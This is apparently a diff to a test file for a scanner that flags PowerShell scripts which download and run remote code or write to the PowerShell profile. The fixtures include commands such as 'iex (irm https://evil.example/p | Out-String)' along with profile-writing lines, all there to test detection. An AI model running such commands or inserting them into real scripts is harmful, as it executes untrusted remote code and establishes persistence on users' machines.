@@ -277,7 +277,7 @@ test('a shell script is read whole for its shell commands and the places it name
     'Invoke-WebRequest https://x.example/f -OutFile f',
     '$iex = 1; $irm = 2',
   ].join('\n')), { shell: [1, 2, 3], persistence: [4, 5] }, 'PowerShell running what it fetches, and its profile')
-  assert.deepEqual(found('setup.ps1', 'Invoke-Expression \u0060\n  (Invoke-WebRequest https://evil.example/p).Content\nirm https://get.example \u0060\n  | iex\niex $x\niwr https://x.example/f -OutFile f\n'), { shell: [1, 3] },
+  assert.deepEqual(found('setup.ps1', 'Invoke-Expression \u0060\n  (Invoke-WebRequest https://evil.example/p).Content\nirm https://get.example \u0060\n  | iex\niex $x\niwr https://x.example/f -OutFile f\niex $x && iwr https://x.example/f -OutFile f\niex (irm https://evil.example/p | Out-String)\n'), { shell: [1, 3, 8] },
     'its line continued by a backtick, not the next line')
   assert.deepEqual(found('setup.ps1', 'Set-Content "$HOME\\Documents\\PowerShell\\Profile.ps1" $p\nAdd-Content $PSHOME\\Profile.ps1 $p\n& ./scripts/profile.ps1\n'), { persistence: [1, 2] },
     'PowerShell\'s all hosts\' profile, not another folder\'s profile.ps1')
